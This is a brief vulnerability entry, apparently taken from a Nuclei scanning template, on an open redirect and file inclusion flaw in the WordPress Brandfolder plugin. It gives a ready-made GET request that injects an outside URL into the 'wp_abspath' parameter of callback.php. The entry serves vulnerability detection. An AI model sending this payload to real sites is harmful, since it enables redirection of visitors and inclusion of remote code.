# Vulnerability: WordPress Brandfolder - Open Redirect (RFI & LFI)
**Classification:** WP
**Source:** Nuclei Template (`brandfolder-open-redirect.yaml`)

## Description
WordPress Brandfolder is vulnerable to remote/local file inclusion and allows remote attackers to inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath' parameter which will redirect the victim to it.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/
```

